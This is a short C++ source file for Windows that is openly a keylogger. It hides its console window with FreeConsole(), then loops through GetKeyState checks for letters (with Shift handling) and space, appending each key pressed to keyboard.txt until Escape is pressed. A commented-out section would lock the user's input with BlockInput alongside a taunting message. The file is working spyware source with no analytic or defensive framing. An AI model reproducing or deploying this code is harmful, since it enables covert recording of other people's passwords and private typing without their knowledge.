#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>

using namespace std;


int main(){
ofstream keylogger;
keylogger.open("keyboard.txt");
bool isRunning = true;
string username;
FreeConsole();
while(isRunning){
if(GetKeyState('A') & 0x8000){ 
keylogger << 'a';} 
if(GetKeyState('B') & 0x8000){ 
keylogger << 'b';} 
if(GetKeyState('C') & 0x8000){ 
keylogger << 'c';} 
if(GetKeyState('D') & 0x8000){ 
keylogger << 'd';} 
if(GetKeyState('E') & 0x8000){ 
keylogger << 'e';} 
if(GetKeyState('F') & 0x8000){ 
keylogger << 'f';} 
if(GetKeyState('G') & 0x8000){ 
keylogger << 'g';} 
if(GetKeyState('H') & 0x8000){ 
keylogger << 'h';} 
if(GetKeyState('I') & 0x8000){ 
keylogger << 'i';}
if(GetKeyState('J') & 0x8000){ 
keylogger << 'j';} 
if(GetKeyState('K') & 0x8000){ 
keylogger << 'k';} 
if(GetKeyState('L') & 0x8000){ 
keylogger << 'l';} 
if(GetKeyState('M') & 0x8000){ 
keylogger << 'm';} 
if(GetKeyState('N') & 0x8000){ 
keylogger << 'n';} 
if(GetKeyState('O') & 0x8000){ 
keylogger << 'o';} 
if(GetKeyState('P') & 0x8000){ 
keylogger << 'p';} 
if(GetKeyState('Q') & 0x8000){ 
keylogger << 'q';} 
if(GetKeyState('R') & 0x8000){ 
keylogger << 'r';} 
if(GetKeyState('S') & 0x8000){ 
keylogger << 's';} 
if(GetKeyState('T') & 0x8000){ 
keylogger << 't';} 
if(GetKeyState('U') & 0x8000){ 
keylogger << 'u';} 
if(GetKeyState('V') & 0x8000){ 
keylogger << 'v';} 
if(GetKeyState('W') & 0x8000){ 
keylogger << 'w';} 
if(GetKeyState('X') & 0x8000){ 
keylogger << 'x';} 
if(GetKeyState('Y') & 0x8000){ 
keylogger << 'y';} 
if(GetKeyState('Z') & 0x8000){ 
keylogger << 'z';}

while(GetKeyState(VK_SHIFT) & 0x8000){
if(GetKeyState('A') & 0x8000){ 
keylogger << 'A';} 
if(GetKeyState('B') & 0x8000){ 
keylogger << 'B';} 
if(GetKeyState('C') & 0x8000){ 
keylogger << 'C';} 
if(GetKeyState('D') & 0x8000){ 
keylogger << 'D';} 
if(GetKeyState('E') & 0x8000){ 
keylogger << 'E';} 
if(GetKeyState('F') & 0x8000){ 
keylogger << 'F';} 
if(GetKeyState('G') & 0x8000){ 
keylogger << 'G';} 
if(GetKeyState('H') & 0x8000){ 
keylogger << 'H';} 
if(GetKeyState('I') & 0x8000){ 
keylogger << 'I';} 
if(GetKeyState('J') & 0x8000){ 
keylogger << 'J';} 
if(GetKeyState('K') & 0x8000){ 
keylogger << 'K';} 
if(GetKeyState('L') & 0x8000){ 
keylogger << 'L';} 
if(GetKeyState('M') & 0x8000){ 
keylogger << 'M';} 
if(GetKeyState('N') & 0x8000){ 
keylogger << 'N';} 
if(GetKeyState('O') & 0x8000){ 
keylogger << 'O';}
if(GetKeyState('P') & 0x8000){ 
keylogger << 'P';} 
if(GetKeyState('Q') & 0x8000){ 
keylogger << 'Q';} 
if(GetKeyState('R') & 0x8000){ 
keylogger << 'R';} 
if(GetKeyState('S') & 0x8000){ 
keylogger << 'S';} 
if(GetKeyState('T') & 0x8000){ 
keylogger << 'T';} 
if(GetKeyState('U') & 0x8000){ 
keylogger << 'U';} 
if(GetKeyState('V') & 0x8000){ 
keylogger << 'V';} 
if(GetKeyState('W') & 0x8000){ 
keylogger << 'W';} 
if(GetKeyState('X') & 0x8000){ 
keylogger << 'X';} 
if(GetKeyState('Y') & 0x8000){ 
keylogger << 'Y';} 
if(GetKeyState('Z') & 0x8000){ 
keylogger << 'Z';}}

if(GetKeyState(VK_SPACE) & 0x8000){ 
keylogger << ' ';} 
if(GetKeyState(VK_ESCAPE) & 0x8000){
keylogger.close();
return 0;
}

}}
/*
while (1){
BlockInput(true);
keylogger << "ha fuck you still";}*/





/*
int running(int action, int typ, int ammo){
switch(action){
case 1:

break;
case 2:

break;
case 3:

break;
}
return 0;
}*/
